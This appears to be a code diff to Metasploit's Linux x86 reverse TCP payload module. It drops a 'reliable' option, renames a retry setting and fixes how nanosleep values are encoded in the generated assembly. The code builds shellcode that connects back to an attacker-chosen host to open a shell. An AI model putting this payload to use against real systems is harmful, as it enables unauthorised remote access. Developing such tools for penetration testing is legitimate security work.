@@ -7,7 +7,6 @@ require 'msf/core/payload/linux/send_uuid'
 
 module Msf
 
-
 ###
 #
 # Complex reverse TCP payload generation for Linux ARCH_X86
@@ -26,17 +25,15 @@ module Payload::Linux::ReverseTcp
   #
   def generate
     conf = {
-      port:              datastore['LPORT'],
-      host:              datastore['LHOST'],
-      retry_count:       datastore['ReverseConnectRetries'],
-      sleep_seconds:     datastore['StagerRetryWait'],
-      reliable:    false
+      port:          datastore['LPORT'],
+      host:          datastore['LHOST'],
+      retry_count:   datastore['StagerRetryCount'],
+      sleep_seconds: datastore['StagerRetryWait'],
     }
 
     # Generate the advanced stager if we have space
     if self.available_space && required_space <= self.available_space
       conf[:exitfunk] = datastore['EXITFUNC']
-      conf[:reliable] = true
     end
 
     generate_reverse_tcp(conf)
@@ -82,17 +79,15 @@ module Payload::Linux::ReverseTcp
   #
   # @option opts [Integer] :port The port to connect to
   # @option opts [String] :host The host IP to connect to
-  # @option opts [Bool] :reliable Whether or not to enable error handling code
   #
   def asm_reverse_tcp(opts={})
     # TODO: reliability is coming
     retry_count  = opts[:retry_count]
-    reliable     = opts[:reliable]
     encoded_port = "0x%.8x" % [opts[:port].to_i, 2].pack("vn").unpack("N").first
     encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
     seconds = (opts[:sleep_seconds] || 5.0)
     sleep_seconds = seconds.to_i
-    sleep_nanoseconds = seconds % 1 * 1000000000
+    sleep_nanoseconds = (seconds % 1 * 1000000000).to_i
 
     asm = %Q^
         push #{retry_count}        ; retry counter
@@ -130,8 +125,8 @@ module Payload::Linux::ReverseTcp
       handle_failure:
         push 0xa2
         pop eax
-        push #{sleep_nanoseconds}  ; nanoseconds
-        push #{sleep_seconds}      ; seconds
+        push 0x#{sleep_nanoseconds.to_s(16)}
+        push 0x#{sleep_seconds.to_s(16)}
         mov ebx, esp
         xor ecx, ecx
         int 0x80                   ; sys_nanosleep
